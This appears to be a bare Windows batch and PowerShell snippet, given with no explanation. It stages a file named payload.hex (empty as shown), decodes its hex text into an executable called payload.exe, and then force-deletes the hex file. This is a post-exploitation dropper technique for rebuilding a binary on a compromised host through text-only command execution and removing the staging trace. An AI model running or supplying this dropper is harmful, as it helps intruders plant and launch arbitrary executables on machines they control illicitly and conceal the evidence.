echo|set /p="">payload.hex
powershell -Command "$h=Get-Content -readcount 0 -path './payload.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'payload.exe' -value $b;Remove-Item -force payload.hex;"
